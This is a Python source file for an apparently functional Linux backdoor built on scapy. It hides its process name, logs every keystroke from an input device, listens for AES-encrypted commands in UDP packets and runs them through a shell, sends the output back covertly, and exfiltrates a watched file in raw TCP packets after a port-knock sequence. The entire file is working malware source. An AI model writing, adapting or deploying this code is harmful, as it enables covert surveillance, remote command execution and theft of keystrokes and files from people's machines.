from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from scapy.layers.inet import UDP, IP, TCP
from scapy.all import sniff, send, Raw
from scapy.volatile import RandShort
from subprocess import run
import sys
import os
import setproctitle
import yaml
import asyncio
from evdev import InputDevice, ecodes, categorize
import time
from threading import Thread
from watch import EventHandler
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from typing import List


key_code_map = {
    0: '',
    1: ' <ESC> ',
    2: '1',
    3: '2',
    4: '3',
    5: '4',
    6: '5',
    7: '6',
    8: '7',
    9: '8',
    10: '9',
    11: '0',
    12: '-',
    13: '=',
    14: ' <BACKSPACE> ',
    15: ' <TAB> ',
    16: 'Q',
    17: 'W',
    18: 'E',
    19: 'R',
    20: 'T',
    21: 'Y',
    22: 'U',
    23: 'I',
    24: 'O',
    25: 'P',
    26: '[',
    27: ']',
    28: ' <ENTER> ',
    29: ' <LEFTCTRL> ',
    30: 'A',
    31: 'S',
    32: 'D',
    33: 'F',
    34: 'G',
    35: 'H',
    36: 'J',
    37: 'K',
    38: 'L',
    39: ';',
    40: "'",
    41: '`',
    42: ' <LEFTSHIFT> ',
    43: '\\',
    44: 'Z',
    45: 'X',
    46: 'C',
    47: 'V',
    48: 'B',
    49: 'N',
    50: 'M',
    51: ',',
    52: '.',
    53: '/',
    54: ' <RIGHTSHIFT> ',
    55: '*',
    56: ' <LEFTALT> ',
    57: ' ',
    58: ' <CAPSLOCK> ',
    59: 'F1',
    60: 'F2',
    61: 'F3',
    62: 'F4',
    63: 'F5',
    64: 'F6',
    65: 'F7',
    66: 'F8',
    67: 'F9',
    68: 'F10',
    69: ' <NUMLOCK> ',
    70: ' <SCROLLLOCK> ',
    71: '7',
    72: '8',
    73: '9',
    74: '-',
    75: '4',
    76: '5',
    77: '6',
    78: '+',
    79: '1',
    80: '2',
    81: '3',
    82: '0',
    83: '.',
    87: 'F11',
    88: 'F12',
    95: ',',
    96: ' <ENTER> ',
    97: ' <RIGHTCTRL> ',
    98: '/',
    100: ' <R_ALT> ',
    102: ' <HOME> ',
    103: ' <UP> ',
    104: ' <PAGE_UP> ',
    105: ' <KEY_LEFT> ',
    106: ' <KEY_RIGHT> ',
    107: ' <END> ',
    108: ' <KEY_DOWN> ',
    109: ' <PAGE_DOWN> ',
    110: ' <INSERT> ',
    111: ' <DELETE> ',
    112: ' <MACRO> ',
    125: ' <WINDOWS_KEY> '
}

class BackDoor:
    def __init__(self):
        print("Backdoor has been initiated")
        self.key = b'\xac\x19\x08\xf8\x80uo\x0c5\xcb\x82_\xc9\xc0\xdc4Z=\xbf\x19\xf0O\xfa\x94\x0fW\x95\xaf=\xe9U\t'
        self.iv = b'\xe4\xba\xa2\x06\xf2\xd6U\xef\x15\xcc\xdaY\x95\xf9\xb5;'
        self.flag_begin = "****["
        self.flag_close = "]****"
        self.recv_port = 0
        self.send_port = 0
        self.client = ""
        self.masked_name = ""
        self.log = ""
        self.device = ""
        self.supported_protos = ["udp", "tcp", "dns"]
        self.proto = ""
        self.watch_dir = ""
        self.watch_file = ""
        self.path = ""
        self.watch_status = False
        self.sequence = []
        self.src_port = ""


    def start(self) -> None:
        self.process_yaml()
        self.hide_process()
        print("Starting......")
        try:
            keylog_t = Thread(target=self.start_keylogger)
            keylog_t.start()

            event_handler = EventHandler(self.watch_file, self)
            observer = Observer()
            observer.schedule(event_handler, self.watch_dir, recursive=True)
            observer.start()

            print("Keylogger started")
            print("Listening for packets")
            print("--------------------------------------------------------------")
            self.sniff_init()
        except KeyboardInterrupt as e:
            observer.stop()
            observer.join()
            sys.exit(" Closed")
        except FileNotFoundError as e:
            sys.exit(" Closed")

    def start_keylogger(self) -> None:
        device = InputDevice(self.device)
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self.keylog(device))

    async def keylog(self, device) -> None:
        with open(self.log, 'a+') as f:
            async for event in device.async_read_loop():
                if event.type == ecodes.EV_KEY and event.value == 1:
                    try:
                        f.write(key_code_map[event.code])
                        f.flush()
                    except KeyError:
                        f.write(f" <Unmapped keycode: {event.code}> ")


    def process_yaml(self) -> None:
        with open('config.yaml', 'r') as f:
            config = yaml.safe_load(f)

        self.masked_name = config['covert']['process_name']
        self.log = config['covert']['log']
        self.device = config['covert']['device']
        self.recv_port = config['covert']['recv_port']
        self.send_port = config['covert']['send_port']
        self.proto = config['share']['proto']
        self.watch_dir, self.watch_file = self.watch_settings(config['covert']['watch'])
        self.path = config['covert']['watch']
        self.client = config['covert']['client']
        self.sequence = config['share']['sequence']
        self.src_port = config['share']['src_port']
        print(f"Masked as {self.masked_name}")
        print(f"log to {self.log}")
        print(f"device is {self.device}")
        print(f"Send is {self.send_port}")
        print(f"recv is {self.recv_port}")
        print(f"proto  is {self.proto}")
        print(f"file  is {self.watch_file}")
        print(f"dir  is {self.watch_dir}")
        print(f"client default is {self.client}")
        print(f"seqwuence  is {self.sequence}")
        print(f"src port  is {self.src_port}")

    def watch_settings(self, path) -> tuple[str, str]:
        file = path.split("/")[-1]
        directory = ""
        index = 0
        for i in range(len(path)-1, -1, -1):
            if path[i] == "/":
                index = i
                break
        directory = path[:index]
        return directory, file

    def send_file(self) -> None:
        """Begins the process of opening client port
        and sending file via covert means
        """
        print("Knocking")
        self.port_knock()
        # Give time for client to open ports
        time.sleep(2)
        self.prepare_data()

    def prepare_data(self) -> None:
        """Gets file data and sends through specified protocol"""
        print(f"sending {self.path}")
        binary_data = self.get_bin()
        if self.proto == "tcp":
            print(f"sending {self.proto}")
            self.create_tcp(binary_data)
        elif self.proto == "udp":
            print(f"sending {self.proto}")
        else:
            print(f"sending {self.proto}")

    def create_tcp(self, data: List) -> None:
        """Creates a TCP packet and embeds data in payload"""
        print("Creating TCP packets")
        packets = []
        for index, byte in enumerate(data):
            packet = IP(dst=self.client) / TCP(sport=self.src_port, dport=self.send_port) / Raw(load=byte)
            packets.append(packet)

        # Add packet to specify end of file
        packet = IP(dst=self.client) / TCP(dport=self.send_port) / Raw(load=b'\x00')
        packets.append(packet)
        self.send_pkt(packets)

    def send_pkt(self, packets: List) -> None:
        """Sends packets"""
        print("Sending packets")
        try:
            send(packets, verbose=0)
        except PermissionError:
            print("Permission error! Run as sudo or admin!")
            sys.exit()

    def get_bin(self) -> List:
        """ Separates a file into chunks of data that can be
        sent in individual payloads
        """
        with open(self.path, 'rb') as f:
            data = f.read()
        load_size = 1024
        binary_data = [data[i:i + load_size] for i in range(0, len(data), load_size)]
        return binary_data

    def port_knock(self)  -> None:
        """Creates and sends sequence of packets to
        open client port
        """
        packets = []
        for i in self.sequence:
            pkt = IP(dst=self.client) / TCP(dport=i, flags="S")
            packets.append(pkt)
        self.send_pkt(packets)

    def craft_packet(self, msg: str):
        ip = IP(dst=self.client)
        udp = UDP(sport=RandShort(), dport=self.send_port)
        payload = msg
        pkt = ip / udp / payload
        try:
            print("Sent!")
            print("--------------------------------------------------------------")
            send(pkt, verbose=0)
        except PermissionError:
            print("Permission error! Run as sudo or admin!")
            sys.exit()

    def prepare_msg(self, cmd: str) -> str:
        cipher = self.generate_cipher()
        cmd = self.flag_begin + cmd + self.flag_close
        encrypted_data = self.encrypt_data(cipher, cmd)
        # Convert the encrypted string to bytes
        print("Preparing response.....")
        hex_str = self.get_hex_string(encrypted_data)
        return hex_str

    def get_hex_string(self, encrypted_line):
        """ Returns hex string of byte stream (encrypted string)"""
        return encrypted_line.hex()

    def sniff_init(self) -> None:
        try:
            sniff(filter=self.proto, prn=lambda p: self.filter_packets(p), store=False)
        except PermissionError:
            print("Permission error! Run as sudo or admin!")
            sys.exit()

    def authenticate_packet(self, data: str, packet) -> str:
        decrypted_msg = self.decrypt_data(data)
        if decrypted_msg.startswith(self.flag_begin) and decrypted_msg.endswith(self.flag_close):
            print(f"Received authenticated packet: {decrypted_msg}")
            if not self.client:
                self.set_client(packet[IP].src)
            return decrypted_msg

    def execute(self, cmd: str) -> None:
        output = run(cmd, shell=True, capture_output=True, text=True)
        output = output.stdout
        msg = self.prepare_msg(output)
        self.craft_packet(msg)

    def filter_packets(self, packet) -> None:
        try:
            msg = packet[UDP].load.decode()
            if UDP in packet and packet[UDP].dport == self.recv_port:
                val = self.authenticate_packet(msg, packet)
                if val:
                    self.process_packet(val)
        except:
            return

    def process_packet(self, data):
        stripped_msg = data.strip(self.flag_begin).rstrip(self.flag_close)
        print(f"Executing: {stripped_msg}")
        self.execute(stripped_msg)

    def set_client(self, ip):
        print(f"Setting client ip as {ip}")
        self.client = ip

    def decrypt_data(self, encrypted_msg: str) -> str:
        encrypted_byte_stream = bytes.fromhex(encrypted_msg)
        cipher = self.generate_cipher()
        # Initialize a decryptor object
        decryptor = cipher.decryptor()
        # Initialize an unpadder object
        unpadder = padding.PKCS7(128).unpadder()
        # Decrypt and remove padding
        padded_message = decryptor.update(encrypted_byte_stream) + decryptor.finalize()
        msg = unpadder.update(padded_message) + unpadder.finalize()
        msg = msg.decode()
        return msg

    def encrypt_data(self, cipher, line) -> bytes:
        """Encrypts message"""
        encryptor = cipher.encryptor()
        # Padding needed at AES requires specific byte size.
        # Allows for custom length messages.
        padder = padding.PKCS7(128).padder()
        padded_line = padder.update(line.encode()) + padder.finalize()
        encrypted_line = encryptor.update(padded_line) + encryptor.finalize()
        return encrypted_line

    def set_hex(self):
        self.hex_data = ""

    def generate_cipher(self) -> Cipher:
        """Generates cipher for encryption"""
        return Cipher(algorithms.AES(self.key), modes.CBC(self.iv))

    def hide_process(self):
        setproctitle.setproctitle(f"{self.masked_name}")
        with open("/proc/self/comm", "w") as f:
            f.write(self.masked_name)
